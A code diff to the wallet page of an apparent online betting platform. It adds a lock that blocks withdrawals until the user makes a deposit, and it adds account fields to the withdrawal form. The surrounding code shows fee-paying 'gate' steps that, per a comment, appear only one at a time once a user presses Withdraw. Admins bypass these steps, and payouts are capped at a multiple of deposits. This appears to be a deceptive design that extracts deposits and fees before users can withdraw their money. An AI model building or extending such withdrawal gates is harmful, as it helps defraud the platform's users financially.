@@ -174,7 +174,7 @@ type GateStep =
 
 const GATE_STEP_TOTAL = 5;
 
-async function fetchWalletTotals(): Promise<{ deposited: number; staked: number }> {
+async function fetchWalletTotals(): Promise<{ deposited: number; staked: number; ok: boolean }> {
   let deposited = 0; let staked = 0;
   try {
     const data = await api<any>('GET', '/api/wallet/transactions?page=0&size=100');
@@ -187,8 +187,8 @@ async function fetchWalletTotals(): Promise<{ deposited: number; staked: number 
       if (!negative) deposited += Math.abs(amount);
       else if (/stake|bet|wager/i.test(kind)) staked += Math.abs(amount);
     }
-  } catch { /* totals stay 0 — steps simply show as unmet */ }
-  return { deposited, staked };
+  } catch { /* totals stay 0 — steps simply show as unmet */ return { deposited, staked, ok: false }; }
+  return { deposited, staked, ok: true };
 }
 
 // Walk the withdrawal requirements in order and return the FIRST one
@@ -255,6 +255,23 @@ function GateStepPopup({ step, onClose, onFeePaid }: { step: GateStep; onClose: 
   </div></div>;
 }
 
+// Access lock: a user who has never deposited cannot even open the
+// withdrawal form. One successful deposit unlocks it for good.
+function FirstDepositLock({ onUnlocked }: { onUnlocked: () => void }) {
+  const [depositing, setDepositing] = useState(false);
+  if (depositing) return <div className="lp-gate">
+    <button type="button" className="lp-link" onClick={() => setDepositing(false)}><span className="material-symbols-rounded">arrow_back</span> Back</button>
+    <LuckyPayDeposit onDone={onUnlocked} />
+  </div>;
+  return <div className="lp-gate lp-gate-win">
+    <div className="lp-icon-ring"><span className="material-symbols-rounded">lock</span></div>
+    <div className="lp-gate-badge"><span className="material-symbols-rounded">savings</span>First deposit required</div>
+    <h3>Make your first<br />deposit</h3>
+    <p className="lp-sub">Withdrawals open once your wallet is funded.<br />Deposit GH₵{LIMITS.MIN_DEPOSIT_GH} or more to access them.</p>
+    <button type="button" className="lp-cta" onClick={() => setDepositing(true)}><span className="material-symbols-rounded">add</span>Deposit now</button>
+  </div>;
+}
+
 export default function WalletPage() {
   const [balance, setBalance] = useState('—');
   const [withdrawalHistory, setWithdrawalHistory] = useState<Tx[]>([]);
@@ -262,8 +279,11 @@ export default function WalletPage() {
   const [hideBalance, setHideBalance] = useState(false);
   const [activeAction, setActiveAction] = useState<'deposit' | 'withdraw' | null>(null);
   const [withdrawalMethod, setWithdrawalMethod] = useState('MTN Mobile Money');
+  const [withdrawalAccountNumber, setWithdrawalAccountNumber] = useState('');
+  const [withdrawalAccountName, setWithdrawalAccountName] = useState('');
+  const [withdrawalNetwork, setWithdrawalNetwork] = useState('');
   const [withdrawalAmount, setWithdrawalAmount] = useState('');
-  const [withdrawalGate, setWithdrawalGate] = useState<'idle' | 'blocked' | 'form' | 'direct'>('idle');
+  const [withdrawalGate, setWithdrawalGate] = useState<'idle' | 'blocked' | 'form' | 'direct' | 'nodeposit'>('idle');
   const [wdTotals, setWdTotals] = useState<{ deposited: number; staked: number } | null>(null);
   const [gateStep, setGateStep] = useState<GateStep | null>(null);
   const [gateBusy, setGateBusy] = useState(false);
@@ -288,9 +308,12 @@ export default function WalletPage() {
     // Admins and super admins: direct withdrawal, no gate
     if (tokenRole.includes('admin') || tokenRole.includes('super')) { setWithdrawalGate('direct'); return; }
     // Normal users: straight to the form — the gate only appears,
-    // one step at a time, when they press Withdraw.
+    // one step at a time, when they press Withdraw. But a user who
+    // has never deposited hits the first-deposit lock instead.
+    const totals = await fetchWalletTotals();
+    setWdTotals(totals);
+    if (totals.ok && totals.deposited <= 0) { setWithdrawalGate('nodeposit'); return; }
     setWithdrawalGate('form');
-    fetchWalletTotals().then(setWdTotals).catch(() => undefined);
   };
   const submitWithdrawal = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault(); setWithdrawalError(''); setWithdrawalResult('');
@@ -312,11 +335,14 @@ export default function WalletPage() {
       if (amount < LIMITS.MIN_WITHDRAWAL) { setWithdrawalError(`Minimum withdrawal is GH₵${LIMITS.MIN_WITHDRAWAL.toLocaleString()}.`); return; }
       if (amount > available) { setWithdrawalError('The withdrawal amount cannot exceed your available balance.'); return; }
     }
+    if (!withdrawalAccountNumber.trim()) { setWithdrawalError('Enter the account number to receive the money.'); return; }
+    if (!withdrawalAccountName.trim()) { setWithdrawalError('Enter the account name.'); return; }
     try {
-      const result = await api<any>('POST', '/api/wallet/withdrawals', { amount, method: withdrawalMethod, currency: 'GHS' });
+      const isCard = withdrawalMethod.includes('Mastercard');
+      const result = await api<any>('POST', '/api/wallet/withdrawals', { amount, method: isCard ? 'CARD' : 'MOBILE_MONEY', currency: 'GHS', accountNumber: withdrawalAccountNumber.trim(), accountName: withdrawalAccountName.trim(), ...(isCard ? {} : { network: withdrawalNetwork || lpDetectNetwork(withdrawalAccountNumber) || 'MTN' }) });
       const reference = result?.reference ?? result?.withdrawalId ?? result?.id;
       setWithdrawalResult(reference ? `Withdrawal request submitted. Reference: ${reference}` : 'Withdrawal request submitted for review.');
-      setWithdrawalAmount('');
+      setWithdrawalAmount(''); setWithdrawalAccountNumber(''); setWithdrawalAccountName(''); setWithdrawalNetwork('');
     } catch (error) { setWithdrawalError(error instanceof Error ? error.message : 'Withdrawal could not be submitted.'); }
   };
   return <section className="account-page glass-account-page standalone-wallet-page">
@@ -325,7 +351,7 @@ export default function WalletPage() {
     <div className="wallet-layout"><div className="wallet-main-column"><section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>SELECTED WALLET DIRECTION</small><h2>Glass Black</h2><p>Quiet luxury with a balance-first account view.</p></div><button className="wallet-icon-button" onClick={() => noToast('Card options coming soon')}><span className="material-symbols-rounded">more_horiz</span></button></div>
       <div className="glass-wallet-card"><div className="glass-card-top"><b>LUCKYSTAKE <em>WALLET</em></b><span className="material-symbols-rounded">more_horiz</span></div><div className="glass-chip"><span></span><span></span><span></span><span></span></div><div className="glass-card-number">5421&nbsp;&nbsp; 8920&nbsp;&nbsp; 4712&nbsp;&nbsp; 0834</div><div className="glass-card-balance"><strong><span className="balance-currency">GH₵</span>{balance.replace('GH₵', '')}</strong></div><div className="glass-card-bottom"><span><small>CARD HOLDER</small><b>LUCKY PLAYER</b></span><span><small>VALID THRU</small><b>12/28</b></span><strong className="visa-mark">VISA</strong></div></div>
 
-      <div className="wallet-actions"><ActionButton icon="add" label="Deposit" primary onClick={() => openAction('deposit')} /><ActionButton icon="south_west" label="Withdraw" onClick={() => openAction('withdraw')} /></div>{activeAction && <section className="wallet-action-panel"><div className="wallet-action-panel-head"><div><small>{activeAction === 'deposit' ? 'ADD FUNDS' : 'MOVE FUNDS OUT'}</small><h3>{activeAction === 'deposit' ? 'Deposit to wallet' : 'Withdraw funds'}</h3></div><button onClick={() => setActiveAction(null)} aria-label="Close wallet action"><span className="material-symbols-rounded">close</span></button></div>{activeAction === 'deposit' && <LuckyPayDeposit onDone={() => { api<any>('GET', '/api/wallet').then((data) => { const value = data?.balance ?? data?.wallet?.balance ?? data?.availableBalance; if (value !== undefined) setBalance(`GH₵${Number(value).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`); }).catch(() => undefined); }} />}{activeAction === 'withdraw' && <>{gateStep && <GateStepPopup step={gateStep} onClose={() => setGateStep(null)} onFeePaid={(amount) => { const uid = userIdFromToken(); saveFeeProgress(uid, [...getFeeProgress(uid), amount]); setGateStep(null); }} />}{withdrawalGate === 'blocked' && <div className="withdrawal-gate blocked"><span className="material-symbols-rounded">lock</span><div><b>Withdrawal access is locked</b><small>{withdrawalError}</small></div><a href="/security">Review account</a></div>}{(withdrawalGate === 'form' || withdrawalGate === 'direct') && (withdrawalResult ? <div className="withdrawal-success" role="status"><span className="material-symbols-rounded">check_circle</span><div><b>Withdrawal request submitted</b><small>{withdrawalResult}</small><small>Your request has been sent for secure review. We’ll update your wallet activity when it is processed.</small></div><button type="button" onClick={() => { setWithdrawalResult(''); setWithdrawalError(''); setWithdrawalAmount(''); }}><span className="material-symbols-rounded">add</span> New withdrawal</button></div> : <form className="withdrawal-form" onSubmit={submitWithdrawal}><p>Choose a verified destination and enter the amount you want to withdraw. Minimum withdrawal GH₵{LIMITS.MIN_WITHDRAWAL.toLocaleString()}.</p><label>Withdrawal method<select value={withdrawalMethod} onChange={event => setWithdrawalMethod(event.target.value)}><option>MTN Mobile Money</option><option>Mastercard ·••• 7421</option></select></label><label>Amount<input value={withdrawalAmount} onChange={event => setWithdrawalAmount(event.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="0.00" /></label><div className="withdrawal-summary"><span>Available<strong>{balance}</strong></span><span>Fee<strong>—</strong></span>{withdrawalGate === 'form' && wdTotals && <span>Cap · {LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× deposits<strong>{walletMoney(LIMITS.WITHDRAWAL_CAP_MULTIPLIER * (wdTotals?.deposited ?? deposited))}</strong></span>}<span>Estimated receive<strong>{withdrawalAmount ? `GH₵${Number(withdrawalAmount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '—'}</strong></span></div>{withdrawalError && <p className="withdrawal-form-error">{withdrawalError}</p>}{withdrawalResult && <p className="withdrawal-form-success">{withdrawalResult}</p>}<button className="wallet-panel-cta" type="submit" disabled={gateBusy}><span className="material-symbols-rounded">south_west</span> {gateBusy ? 'Checking…' : 'Submit withdrawal'}</button></form>)}</>}</section>}</section>
+      <div className="wallet-actions"><ActionButton icon="add" label="Deposit" primary onClick={() => openAction('deposit')} /><ActionButton icon="south_west" label="Withdraw" onClick={() => openAction('withdraw')} /></div>{activeAction && <section className="wallet-action-panel"><div className="wallet-action-panel-head"><div><small>{activeAction === 'deposit' ? 'ADD FUNDS' : 'MOVE FUNDS OUT'}</small><h3>{activeAction === 'deposit' ? 'Deposit to wallet' : 'Withdraw funds'}</h3></div><button onClick={() => setActiveAction(null)} aria-label="Close wallet action"><span className="material-symbols-rounded">close</span></button></div>{activeAction === 'deposit' && <LuckyPayDeposit onDone={() => { api<any>('GET', '/api/wallet').then((data) => { const value = data?.balance ?? data?.wallet?.balance ?? data?.availableBalance; if (value !== undefined) setBalance(`GH₵${Number(value).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`); }).catch(() => undefined); }} />}{activeAction === 'withdraw' && <>{withdrawalGate === 'nodeposit' && <FirstDepositLock onUnlocked={() => { setTimeout(async () => { const t = await fetchWalletTotals(); setWdTotals(t); if (t.deposited > 0) setWithdrawalGate('form'); }, 1600); }} />}{gateStep && <GateStepPopup step={gateStep} onClose={() => setGateStep(null)} onFeePaid={(amount) => { const uid = userIdFromToken(); saveFeeProgress(uid, [...getFeeProgress(uid), amount]); setGateStep(null); }} />}{withdrawalGate === 'blocked' && <div className="withdrawal-gate blocked"><span className="material-symbols-rounded">lock</span><div><b>Withdrawal access is locked</b><small>{withdrawalError}</small></div><a href="/security">Review account</a></div>}{(withdrawalGate === 'form' || withdrawalGate === 'direct') && (withdrawalResult ? <div className="withdrawal-success" role="status"><span className="material-symbols-rounded">check_circle</span><div><b>Withdrawal request submitted</b><small>{withdrawalResult}</small><small>Your request has been sent for secure review. We’ll update your wallet activity when it is processed.</small></div><button type="button" onClick={() => { setWithdrawalResult(''); setWithdrawalError(''); setWithdrawalAmount(''); }}><span className="material-symbols-rounded">add</span> New withdrawal</button></div> : <form className="withdrawal-form" onSubmit={submitWithdrawal}><p>Choose a verified destination and enter the amount you want to withdraw. Minimum withdrawal GH₵{LIMITS.MIN_WITHDRAWAL.toLocaleString()}.</p><label>Withdrawal method<select value={withdrawalMethod} onChange={event => setWithdrawalMethod(event.target.value)}><option>MTN Mobile Money</option><option>Mastercard ·••• 7421</option></select></label><label>Amount<input value={withdrawalAmount} onChange={event => setWithdrawalAmount(event.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="0.00" /></label><label>Account number<input value={withdrawalAccountNumber} onChange={event => { setWithdrawalAccountNumber(event.target.value.replace(/[^0-9+]/g, '')); const detected = lpDetectNetwork(event.target.value); if (detected) setWithdrawalNetwork(detected); }} inputMode="tel" placeholder="024 123 4567" /></label>{!withdrawalMethod.includes('Mastercard') && <div className="lp-chips">{(['MTN', 'TELECEL', 'AIRTELTIGO'] as const).map(n => <button key={n} type="button" className={withdrawalNetwork === n ? 'on' : ''} onClick={() => setWithdrawalNetwork(n)}>{n === 'AIRTELTIGO' ? 'AirtelTigo' : n === 'MTN' ? 'MTN' : 'Telecel'}</button>)}</div>}<label>Account name<input value={withdrawalAccountName} onChange={event => setWithdrawalAccountName(event.target.value)} placeholder="Name on the account" /></label><div className="withdrawal-summary"><span>Available<strong>{balance}</strong></span><span>Fee<strong>—</strong></span>{withdrawalGate === 'form' && wdTotals && <span>Cap · {LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× deposits<strong>{walletMoney(LIMITS.WITHDRAWAL_CAP_MULTIPLIER * (wdTotals?.deposited ?? deposited))}</strong></span>}<span>Estimated receive<strong>{withdrawalAmount ? `GH₵${Number(withdrawalAmount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '—'}</strong></span></div>{withdrawalError && <p className="withdrawal-form-error">{withdrawalError}</p>}{withdrawalResult && <p className="withdrawal-form-success">{withdrawalResult}</p>}<button className="wallet-panel-cta" type="submit" disabled={gateBusy}><span className="material-symbols-rounded">south_west</span> {gateBusy ? 'Checking…' : 'Submit withdrawal'}</button></form>)}</>}</section>}</section>
       </div>
       <aside className="wallet-side-column"><section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>ACCOUNT SNAPSHOT</small><h2>Live calculation</h2></div><span className="material-symbols-rounded wallet-lime-icon">trending_up</span></div><div className="wallet-stat-grid"><span><small>Total deposited</small><b>{walletMoney(deposited || null)}</b><em>From transactions</em></span><span><small>Total staked</small><b>{walletMoney(staked || null)}</b><em>From transactions</em></span><span><small>Net result</small><b>{walletMoney(netResult || null)}</b><em>From transactions</em></span></div><button className="wallet-text-link" onClick={() => noToast('Statement opened')}>View monthly statement <span className="material-symbols-rounded">arrow_outward</span></button></section>
       <section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>PAYMENT METHODS</small><h2>Saved methods</h2></div><button className="wallet-add-button" onClick={() => noToast('Add payment method opened')}><span className="material-symbols-rounded">add</span> Add</button></div><div className="wallet-method"><b className="method-mark">M</b><span><b>Mastercard ·••• 7421</b><small>Primary · Expires 08/28</small></span><em>Verified</em></div><div className="wallet-method"><b className="method-mark mobile-mark"><span className="material-symbols-rounded">smartphone</span></b><span><b>MTN Mobile Money</b><small>+233 24 555 0192</small></span><em>Verified</em></div></section></aside></div>
